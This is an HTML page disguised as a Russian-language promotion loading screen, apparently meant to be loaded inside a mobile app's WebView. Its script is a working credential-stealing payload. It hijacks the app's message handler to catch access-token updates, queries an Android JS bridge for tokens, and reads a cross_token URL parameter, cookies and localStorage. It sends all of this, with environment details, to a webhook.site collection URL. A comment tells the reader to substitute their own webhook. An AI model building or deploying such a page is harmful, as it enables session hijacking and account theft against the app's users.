<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            font-family: -apple-system, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .loader {
            text-align: center;
            color: #999;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #ddd;
            border-top-color: #e31e25;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Загрузка акции...</p>
    </div>

    <script>
    // ЗАМЕНИ НА СВОЙ WEBHOOK.SITE URL
    var WEBHOOK = 'https://webhook.site/52dbaa1f-6ce3-490d-b01b-32f3ed2b7fe9/44b7c6e1-4edb-49c8-ad62-1f56ae074e3a';

    // === Метод 1: Перехват handleMobileMessage ===
    // Приложение вызывает window.handleMobileMessage(data)
    // для передачи событий в WebView, включая tokenUpdated с access-token
    window.handleMobileMessage = function(data) {
        // data = JSON строка вида {"type":"tokenUpdated","token":"eyJ..."}
        new Image().src = WEBHOOK + '?method=handleMobileMessage&data=' + encodeURIComponent(data);
    };

    // === Метод 2: JS Bridge Android.postMessage() ===
    // Пробуем дёрнуть bridge чтобы приложение ответило с токеном
    try {
        if (typeof Android !== 'undefined' && Android.postMessage) {
            // Отправляем команду, которую WebProgramJsInterface обработает
            Android.postMessage(JSON.stringify({
                type: 'getToken'
            }));
            Android.postMessage(JSON.stringify({
                type: 'tokenRequest'
            }));
            // Фиксируем что bridge доступен
            new Image().src = WEBHOOK + '?method=jsBridge&status=available';
        }
    } catch(e) {
        new Image().src = WEBHOOK + '?method=jsBridge&error=' + encodeURIComponent(e.message);
    }

    // === Метод 3: Читаем cross_token если он в URL ===
    // Работает если вызвано через webWithAuth
    var params = new URLSearchParams(window.location.search);
    var crossToken = params.get('cross_token');
    if (crossToken) {
        new Image().src = WEBHOOK + '?method=crossToken&token=' + encodeURIComponent(crossToken);
    }

    // === Метод 4: Перехват cookie и localStorage ===
    try {
        var cookies = document.cookie;
        var storage = JSON.stringify(localStorage);
        if (cookies || storage !== '{}') {
            new Image().src = WEBHOOK + '?method=storage&cookies='
                + encodeURIComponent(cookies)
                + '&localStorage=' + encodeURIComponent(storage);
        }
    } catch(e) {}

    // === Метод 5: Информация об окружении ===
    new Image().src = WEBHOOK + '?method=info'
        + '&url=' + encodeURIComponent(window.location.href)
        + '&ua=' + encodeURIComponent(navigator.userAgent)
        + '&referrer=' + encodeURIComponent(document.referrer);

    </script>
</body>
</html>
